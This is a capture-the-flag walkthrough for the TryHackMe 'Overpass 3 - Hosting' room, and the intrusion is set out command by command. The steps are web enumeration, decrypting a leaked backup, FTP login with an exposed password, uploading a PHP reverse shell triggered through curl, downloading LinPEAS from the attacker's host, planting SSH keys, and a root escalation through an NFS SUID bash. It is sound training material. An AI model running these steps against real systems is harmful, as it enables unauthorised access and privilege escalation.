# Overpass 3 - Hosting

Link: [Overpass 3 - Hosting](https://tryhackme.com/room/overpass3hosting)

## High-Level Overview

The Overpass company decided to launch a new business venture of web hosting. Let's see if they learned from past mistakes and they are secure.

## Tools Needed

* Nmap
* Gobuster
* Reverse php shell
* LinPEAS
* sshpass

## Walkthrough

We begin with an nmap scan of the machine:

```bash
sudo nmap -T5 -vvv -A -Pn -oN nmap-scan -p- MACHINE:IP
```

We have identified 3 ports open:

* 21 - ftp
* 22 - ssh
* 80 - http

Exploring the web application we come across the employee list which serves as a list of potential login credentials: `Paradox`, `Elf`, `MuirlandOracle`, `NinjaJc01`

We try to find other interesting locations on the web application using gobuster

```bash
$ gobuster dir -k -u MACHINE:IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

We have found a page in `http://MACHINE:IP/backups` which contains an archive named `backup.zip`

The archive contains 2 files: `priv.key` and `CustomerDetails.xlsx.gpg`. We can use `gpg` to decrypt the `CustomerDetails.xlsx` file.

```bash
$ gpg --import priv.key
$ gpg --decrypt-file CustomerDetails.xlsx.gpg
```

The decrypted file contains customers usernames as well as passwords and credit card information.

We can try connecting to the ftp service running on the server using the identified credentials

```bash
$ ftp MACHINE:IP
# paradox
# ShibesAreGreat123
> ls
```

Seems like the `paradox` user is in charge of the web application resources. Since we can upload files we can try uploading a php reverse shell from https://github.com/pentestmonkey/php-reverse-shell.

```bash
> put shell.php
> exit
```

We can start a netcat listener and to trigger the shell we can browse to where the shell is uploaded.

```bash
$ nc -nlvp 1234
$ curl -s http://MACHINE:IP/shell.php
```

Now we should have a reverse shell binding to us. We can start looking for the web flag. We use the following commands to find and display the web flag.

```bash
$ find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
$ cat /usr/share/httpd/web.flag
```

Now we need to find the user flag, and we know it should be listed under `/home/james/`.

We can log switch user to paradox since we know the credentials already. Then we can transfer the LinPEAS enumeration tool, by hosting a Python Simple HTTP server on the attacking machine and using curl on the overpass machine:

* on the attacking machine:

```bash
python3 -m http.server 8000
```

* on the overpass machine:

```bash
$ su paradox
# upgrade the shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
$ stty raw -echo;fg
$ export SHELL=bash
$ export TERM=xterm-256color
# change to the user's home folder so we have permission to write
$ cd /home/paradox
$ curl -s http://VPN:IP:8000/linpeas.sh -o linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

Investigating the output, nothing seems like it would help, but there appears to be a NFS share under `/home/james` running on port 2049. This however is only accessible to localhost.

* on the attacking machine

```bash
$ ssh-keygen
# go through the options
# you will have 2 files: id_rsa private key and id_rsa.pub public key
$ cat id_rsa.pub
```

* on the overpass machine

```bash
# echo the contents of your id_rsa.pub file in the authorized_keys
$ echo "ssh-rsa -PUBLIC-KEY-CONTENTS- radu@kali" >> /home/paradox.ssh/authorized_keys
```

* back on the attacking machine

```bash
$ ssh paradox@MACHINE:IP -i id_rsa
```

After logging in using SSH we investigate the NFS service

```bash
$ service rpcbind status
$ ss -natu | grep 2049
```

Log out of the previous ssh session and connect back using SSH but this time tunnel through the NFS service.

```bash
ssh -i id_rsa -L 2049:127.0.0.1:2049 paradox@MACHINE:IP
```

Back on your attacking machine, mount the NFS share using the commands below. The `user.flag` file has the second flag of this challenge.

```bash
$ mkdir tmp
$ sudo mount -t nfs -o port=2049 localhost:/ ./tmp
```

Inside the mounted share we also have a `.ssh/` folder that has authorized_keys. We will also be replacing the authorized key contents with our own public key

```bash
$ echo "ssh-rsa -PUBLIC-KEY-CONTENTS- radu@kali" >> /tmp/.ssh/authorized_keys
```

Now we can use SSH to log in as `james`

```bash
$ ssh james@MACHINE:IP -i id_rsa
```

We can copy the bash files of james into the NFS share mount location with the command

```bash
cp /usr/bin/bash /home/james/
```

In the mounted directory on the attacking machine, we need to do a few things as root user:

```bash
$ sudo chown root:root bash
$ sudo chmod +s bash
```

And finally, on the overpass machine as user james we need to run

```bash
$ ./bash -p
```

Finally, we are root and we can go to the `root` folder and get the final flag.

```bash
$ cd /root
$ cat root.flag
```